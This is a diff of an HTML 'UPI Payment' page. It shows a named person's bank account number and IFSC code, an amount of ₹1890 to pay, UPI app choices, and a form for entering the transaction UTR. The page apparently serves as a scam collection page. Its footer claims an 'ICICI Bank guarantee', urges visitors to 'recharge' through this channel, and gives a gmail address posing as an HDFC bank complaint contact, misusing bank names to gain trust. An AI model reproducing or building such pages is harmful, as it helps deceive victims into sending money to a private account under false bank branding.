@@ -2,58 +2,49 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>UPI Payment</title>
   <link rel="stylesheet" href="styles.css">
-  <!-- Font and Icon Libraries -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
- 
-  <link rel="stylesheet" href="style.css">
-  
 </head>
 <body>
-  
-    </span>
-    </header>
-    <div class="content">
+   <span>
+    <header>
+      <div class="container">
       <div class="info">
-              <p><span>Amount:</span> <align="right"> <strong>₹1890</strong> <button onclick="copyText('1890')">COPY</button> </align> </p>
+        <p><span>Amount:</span> <align="right"> <strong>₹1890</strong> <button onclick="copyText('1890')">COPY</button> </align> </p>
         <p><span>Account Number:</span> <align="right"> <strong>519110110007808</strong> <button onclick="copyText('519110110007808')">COPY</button> </align> </p>
             <p><span>IFSC Code:</span> <align="right"> <strong>BKID0005191</strong> <button onclick="copyText('BKID0005191')">COPY</button> </align> </p>
             <p><span>Name:</span> <align="right"> <strong>AMIT KUMAR NEGI</strong> <button onclick="copyText('AMIT KUMAR NEGI')">COPY</button> </align> </p>
         
 <p><span>Bank Name:</span> <align="right"> <strong>Bank of India</strong> <button onclick="copyText('Bank of India')">COPY</button> </align> </p>
     </div>
-    
+        
       <label class="section-title">↓ Select payment method and pay ↓</label> 
       <div class="payment-options"> <hr>
-      <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="43px" height="20px" style="vertical-align:middle"> </label> <hr>
-              <tr>
+      
         <label><input type="radio" name="payment-method" value="phonepe"> <img src="https://i.ibb.co.com/dtpd8d8/IMG-3881.png" alt="IMG-3881" width="79px" height="25px" style="vertical-align:middle"> </label> <hr>
             <tr>
-        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="76px" height="20px" style="vertical-align:middle"> </label> <hr> </hr>
+        <label><input type="radio" name="payment-method" value="paytm"> <img src="https://i.ibb.co.com/1YgNg3b/IMG-3888.png" alt="IMG-3888" width="76px" height="25px" style="vertical-align:middle"> </label> <hr>
+              <tr>
+        <label><input type="radio" name="payment-method" value="gpay"> <img src="https://i.ibb.co.com/K9cN6NJ/IMG-3882.png" alt="IMG-3882"width="63px" height="30px" style="vertical-align:middle"> </label> <hr> </hr>
         </div>
       <p class="utr-instruction">↓ Fill the UTR numbers after you done payment ↓</p> 
-     
-    <div class="inline-elements"> <right></right>
-       U<br>
-       T<br>
-       R <input type="text" id="utr" placeholder="Input UTR number"> </div>
-
+      
+    <div class="inline-elements"> <span>UTR</span> <align="right"> <input type="text" id="utr" placeholder="Input UTR number"> </align="right"></div>
+    <hr>
       <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
-     
       <button class="error-btn">Pay failed? Report error</button>
-    </div>
-    
-      <left>
-        <h6 style="color: lightgray; font-size: 12px;">Dear customers: please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:</h6> </le> <center> <h6 style= "color:blue;font-size:10px;"> hdfcbankcomplaintacceptance@gmail.com </center>
-        </h6>
-          </div>
+      </div>
+     <center> <div class="inline-elementss" style="margin-top:20px;align:justify-center;"> <img src="https://i.ibb.co.com/Bsy5F40/IMG-5519.jpg" alt="IMG-5519" style="width: 34px; height: 30px; border-radius: 5px;"> <img src="https://i.ibb.co.com/rFxbvZ2/IMG-5518.png" alt="IMG-5518" style="width: 34px; height: 30px; border-radius: 5px;"> <img src="https://i.ibb.co.com/jTnN0LN/IMG-5516.png" alt="IMG-5516" style="width: 34px; height: 22px; border-radius: 5px;"> <img src="https://i.ibb.co.com/XZyYVF0/IMG-3880.png" alt="IMG-3880" style="width: 34px; height: 22px; border-radius: 2px;"> </div></center>
+          </div> 
+        <center>  <div class="van-row"> 
+        <div body="Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact:"style="align:center; justify:center; font-weight:500; font-size: 0.7rem; margin-top:1.2rem; color: rgb(136, 134, 134);">Dear customers: Please give priority to this channel to recharge! Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable! If you have any questions, please contact: <a href="mailto:hdfcbankcomplaintacceptance@gmail.com" style="color: royalblue;">hdfcbankcomplaintacceptance@gmail.com</a></center>
+
+        </div>
   <!-- Notification Popup -->
   <div id="notification" class="notification"></div>
-  
 <script src="script.js"> </script>
-
 </body>
 </html>
